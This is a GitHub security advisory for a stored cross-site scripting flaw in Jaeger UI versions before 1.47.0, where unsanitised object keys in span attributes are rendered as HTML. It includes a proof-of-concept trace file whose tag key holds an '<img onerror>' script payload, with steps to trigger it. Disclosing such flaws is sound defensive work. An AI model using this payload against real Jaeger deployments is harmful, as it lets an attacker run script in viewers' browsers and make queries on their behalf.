# [M] A stored XSS in jaeger UI might allow an attacker who controls a trace to perform arbitrary jaeger queries

## Summary
Severity: Medium
Advisory: GHSA-2w8w-qhg4-f78j
CWE: CWE-79
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N (CVSS_V3)
Published: 2023-07-11
Source: https://github.com/advisories/GHSA-2w8w-qhg4-f78j
Type: github-advisory

## Affected
- Go: `github.com/jaegertracing/jaeger` — affected >=0 <1.47.0

## Details
Related UI vulnerability advisory: https://github.com/jaegertracing/jaeger-ui/security/advisories/GHSA-vv24-rm95-q56r

### Summary
Jaeger UI is using the `json-markup` dependency to display span attributes and resources. This dependency is not sanitising keys of an object though, thus the `KeyValuesTable` is vulnerable to XSS. 

### Details
The vulnerable line is here: https://github.com/jaegertracing/jaeger-ui/blob/main/packages/jaeger-ui/src/components/TracePage/TraceTimelineViewer/SpanDetail/KeyValuesTable.tsx#L49

### PoC

1. Start a Jaeger UI
2. Save the following trace as a file:
```json
{
    "data": [
        {
            "traceID": "076ef819cc06c45a",
            "spans": [
                {
                    "traceID": "076ef819cc06c45a",
                    "spanID": "076ef819cc06c45a",
                    "flags": 1,
                    "operationName": "and open 'attributes'",
                    "references": [],
                    "startTime": 1678196149232010,
                    "duration": 13485,
                    "tags": [
                        {
                            "key": "sampler.type",
                            "type": "string",
                            "value": "{\"<img src=x onerror=alert(1)>\":\"test\"}"
                        }
                    ],
                    "logs": [],
                    "processID": "p1",
                    "warnings": null
                }
            ],
            "processes": {
                "p1": {
                    "serviceName": "click here",
                    "tags": [
                    ]
                }
            },
            "warnings": null
        }
    ],
    "total": 0,
    "limit": 0,
    "offset": 0,
    "errors": null
}
```
3. Upload that trace to Jaeger UI in order to visualise it.
4. Open the trace, open it's span's attributes.
5. XSS should be fired.

### Impact

This is a XSS on Jaeger UI. XSS can be used to run JavaScript.

## References
- https://github.com/jaegertracing/jaeger-ui/security/advisories/GHSA-vv24-rm95-q56r
- https://github.com/jaegertracing/jaeger/security/advisories/GHSA-2w8w-qhg4-f78j
- https://github.com/jaegertracing/jaeger
- https://github.com/jaegertracing/jaeger-ui/blob/main/packages/jaeger-ui/src/components/TracePage/TraceTimelineViewer/SpanDetail/KeyValuesTable.tsx#L49
